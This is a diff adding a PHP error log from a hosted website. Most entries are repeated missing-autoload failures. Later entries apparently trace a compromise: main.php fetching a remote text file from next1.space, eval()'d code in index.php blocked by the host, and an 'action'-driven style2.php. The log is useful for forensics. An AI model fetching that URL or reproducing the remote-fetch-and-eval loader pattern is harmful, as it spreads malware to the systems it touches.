@@ -1,0 +1,28 @@
+[26-Sep-2024 07:44:46 UTC] PHP Warning:  require(/home/szamymni/notundesh24.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:44:46 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/szamymni/notundesh24.com/../vendor/autoload.php' (include_path='.:/opt/alt/php81/usr/share/pear:/opt/alt/php81/usr/share/php:/usr/share/pear:/usr/share/php') in /home/szamymni/notundesh24.com/index.php:34
+Stack trace:
+#0 {main}
+  thrown in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:44:47 UTC] PHP Warning:  require(/home/szamymni/notundesh24.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:44:47 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/szamymni/notundesh24.com/../vendor/autoload.php' (include_path='.:/opt/alt/php81/usr/share/pear:/opt/alt/php81/usr/share/php:/usr/share/pear:/usr/share/php') in /home/szamymni/notundesh24.com/index.php:34
+Stack trace:
+#0 {main}
+  thrown in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:44:50 UTC] PHP Warning:  require(/home/szamymni/notundesh24.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:44:50 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/szamymni/notundesh24.com/../vendor/autoload.php' (include_path='.:/opt/alt/php81/usr/share/pear:/opt/alt/php81/usr/share/php:/usr/share/pear:/usr/share/php') in /home/szamymni/notundesh24.com/index.php:34
+Stack trace:
+#0 {main}
+  thrown in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:47:27 UTC] PHP Warning:  require(/home/szamymni/notundesh24.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/szamymni/notundesh24.com/index.php on line 34
+[26-Sep-2024 07:47:27 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/szamymni/notundesh24.com/../vendor/autoload.php' (include_path='.:/opt/alt/php81/usr/share/pear:/opt/alt/php81/usr/share/php:/usr/share/pear:/usr/share/php') in /home/szamymni/notundesh24.com/index.php:34
+Stack trace:
+#0 {main}
+  thrown in /home/szamymni/notundesh24.com/index.php on line 34
+[31-Oct-2024 02:17:15 UTC] PHP Warning:  Undefined array key "action" in /home/szamymni/notundesh24.com/style2.php on line 2
+[23-Feb-2025 20:54:37 UTC] PHP Warning:  file_get_contents(https://next1.space/hdsfkj/y2.txt): Failed to open stream: HTTP request failed! in /home/szamymni/notundesh24.com/main.php on line 7
+[27-Feb-2025 09:57:01 UTC] PHP Fatal error:  DISEVAL - Use of eval is forbidden in /home/szamymni/notundesh24.com/index.php(4) : eval()'d code on line 1
+[27-Feb-2025 09:57:23 UTC] PHP Fatal error:  DISEVAL - Use of eval is forbidden in /home/szamymni/notundesh24.com/index.php(4) : eval()'d code on line 1
+[27-Feb-2025 09:57:27 UTC] PHP Fatal error:  DISEVAL - Use of eval is forbidden in /home/szamymni/notundesh24.com/index.php(4) : eval()'d code on line 1
+[27-Feb-2025 09:57:59 UTC] PHP Fatal error:  DISEVAL - Use of eval is forbidden in /home/szamymni/notundesh24.com/index.php(4) : eval()'d code on line 1
+[27-Feb-2025 09:58:34 UTC] PHP Fatal error:  DISEVAL - Use of eval is forbidden in /home/szamymni/notundesh24.com/index.php(4) : eval()'d code on line 1
+[27-Feb-2025 09:59:22 UTC] PHP Warning:  Undefined array key "action" in /home/szamymni/notundesh24.com/style2.php on line 3
